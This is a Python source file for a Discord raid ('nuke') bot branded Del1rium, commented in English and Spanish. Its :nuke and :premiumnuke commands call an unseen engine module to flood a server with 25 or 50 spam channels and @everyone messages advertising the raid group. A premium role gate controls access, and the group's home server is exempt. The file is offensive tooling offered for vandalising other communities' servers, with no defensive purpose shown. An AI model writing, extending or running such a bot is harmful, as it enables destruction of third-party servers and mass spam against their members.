import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import engine # Import our custom engine module

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ MAIN CONFIGURATION / CONFIGURACION PRINCIPAL ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ RAID CONFIGURATION / CONFIGURACION DE RAID ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
NORMAL_NUKE_CHANNEL_NAME = "raid-by-del1rium"
NORMAL_NUKE_TEXT = "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)"
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON_URL = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ INITIALIZATION / INICIALIZACION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server: return False
        member = central_server.get_member(ctx.author.id)
        if not member or not any(role.id == PREMIUM_ROLE_ID for role in member.roles):
            try: 
                embed = discord.Embed(
                    title="RESTRICTED ACCESS / ACCESO RESTRINGIDO",
                    description="This feature is for Premium users only.\nEsta funcion es solo para usuarios Premium.",
                    color=0x2b2d31
                )
                await ctx.send(embed=embed, delete_after=10)
            except discord.Forbidden: pass
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM SYSTEM - STATUS: ONLINE / EN LINEA
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    User / Usuario: {bot.user.name}
    Owner ID / ID Dueno: {OWNER_ID}
    Engine: Modular Anti-Bot Active
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COMMAND MODULES / MODULO DE COMANDOS ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def custom_help(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(
            title="PROTECTED SERVER / SERVIDOR PROTEGIDO",
            description="Attack functions are disabled here.\nLas funciones de ataque estan desactivadas.",
            color=0x2b2d31
        )
        await ctx.send(embed=embed, delete_after=15)
        return

    await ctx.message.delete()
    embed = discord.Embed(
        title="OPERATION MENU / MENU DE OPERACIONES",
        description="Available commands for execution.\nComandos disponibles para ejecucion.",
        color=0x2b2d31
    )
    embed.add_field(name="PUBLIC COMMANDS / COMANDOS PUBLICOS", value="> `:nuke` \nStandard raid (25 channels).", inline=False)
    embed.add_field(name="PREMIUM COMMANDS / COMANDOS PREMIUM", value="> `:premiumnuke` \nMassive raid (50 channels + roles).\n\n> `:nukeconfig <name>, <text>` \nConfigure premium payload.", inline=False)
    embed.set_footer(text="Del1rium Co. | Global Operations Management")
    help_message = await ctx.send(embed=embed)
    await asyncio.sleep(60)
    await help_message.delete()

@bot.command(name='nuke')
async def nuke_normal(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    # Call the engine
    await engine.execute_nuke(ctx, bot, NORMAL_NUKE_CHANNEL_NAME, NORMAL_NUKE_TEXT, 25, 500, False, LOG_CHANNEL_ID, RAID_ICON_URL)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    # Call the engine
    await engine.execute_nuke(ctx, bot, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, True, LOG_CHANNEL_ID, RAID_ICON_URL)

@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="SYNTAX ERROR / ERROR DE SINTAXIS", description="Usage / Uso: :nukeconfig name, text", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=10)
        return

    channel_name, spam_text = [x.strip() for x in args.split(",", 1)]
    if not channel_name or not spam_text: return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="CONFIGURATION UPDATED / CONFIGURACION ACTUALIZADA", color=0x2b2d31)
    embed.add_field(name="Channels / Canales", value=f"`{channel_name}`", inline=True)
    embed.add_field(name="Text / Texto", value=f"```{spam_text}```", inline=False)
    
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    try: await confirmation_msg.delete()
    except: pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
